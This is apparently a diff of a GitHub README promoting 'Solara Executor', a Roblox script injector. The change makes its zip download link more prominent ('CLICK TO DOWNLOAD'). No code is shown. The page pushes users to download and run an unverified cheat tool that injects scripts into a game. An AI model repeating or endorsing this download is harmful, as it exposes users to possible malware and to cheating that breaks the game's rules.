@@ -1,6 +1,6 @@
 ![image](https://github.com/user-attachments/assets/3e0de218-e526-431f-81b9-6d6d853707ba)
 
-Download: ![link](https://github.com/Golf0/Solara-Executor/archive/refs/heads/main.zip)
+Download: ![CLICK TO DOWNLOAD](https://github.com/Golf0/Solara-Executor/archive/refs/heads/main.zip)
 
 User-Friendly Interface: Solara offers a clean and intuitive interface that makes it easy to load and inject scripts with just a few clicks.
 Wide Compatibility: Supports a broad range of Roblox scripts and is regularly updated to ensure compatibility with the latest Roblox updates.
